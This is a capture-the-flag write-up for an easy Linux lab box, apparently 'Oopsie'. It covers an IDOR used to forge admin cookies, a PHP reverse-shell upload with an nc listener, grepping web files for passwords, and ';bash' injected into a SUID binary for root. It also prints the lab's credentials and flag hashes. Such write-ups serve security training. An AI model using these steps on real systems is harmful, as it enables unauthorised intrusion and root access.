System: Linux
Difficulty: Very Easy

IP Address: 10.129.167.53

# User Flag

NMAP Ports are enumerated. 
```
kali@kali:~$ sudo nmap 10.129.167.53 -sC -sV -v
```

Here are the results.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The web server is visited and analyzed.
After observing the Webpage Source Code, it is possible to see a new link `/cdn-cgi/login`.

![[oopsie_1.png]]

A login page is returned. The web application can be accessed as a guest for now.
After investigating the interface, there is an uploads link that can only be accessed through admin privileges.

After trying to list the user, an IDOR vulnerability is identified.
Setting the userID to 1 returns the admin user ID.
This ID can be used to pass as a cookie and access the uploads form. 
Both the user and role cookies are changed to the respective values of `34322` and `admin`.

![[oopsie_2.png]]

The famous `php-reverse-shell.php` file is modified with the right IP Address and Port. 
Then the file is successfully uploaded.

The shell will be listening on the attacker's system.
```
sudo nc -lvnp 4444
```

The file can be accessed through this link.
```
http://10.129.167.53/uploads/php-reverse-shell.php
```

The shell is accessed.
Through the shell session, passwords are enumerated in the `/var/www/html/cdn-cgi/login` directory.
```
cat * | grep -i pass*
```

A password has been found from `index.php`, `MEGACORP_4dm1n!!`.
```
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
www-data@oopsie:/var/www/html/cdn-cgi/login$
```

And another one from `db.php` file, `M3g4C0rpUs3r!`.
```
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

It is also possible to see that there is a user named `robert` on the system.
```
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat /etc/passwd | grep bash
```

```
root:x:0:0:root:/root:/bin/bash
robert:x:1000:1000:robert:/home/robert:/bin/bash
```

Login through the SSH Session is attempted.
```
ssh robert@10.129.167.53
```

Here are the contents of the User Flag found in the user directory.
```
f2c74ee8db7983851ab2a96a44eb7981
```

# Root Flag

According to the ID Displaying, the user `robert` is part of the `bugtracker` group.
```
robert@oopsie:/$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

It is possible to see that there is a privileged binary found on the server.
```
find / -group bugtracker 2>/dev/null
```

After checking the `/usr/bin/bugtracker` file, it is possible to see SUID Permissions.
```
robert@oopsie:/usr/bin$ ls -l /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

This command is executed with root permissions by default.
A prompt is now asked to provide an ID.
```
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 
```

This might be a filtering injection vulnerability so a command is injected. 
The command has been executed successfully and the session is now owned by root.
```
;bash
```

Here are the contents of the Root Flag.
```
af13b0bee69f8a877c3faf667f7beacf
```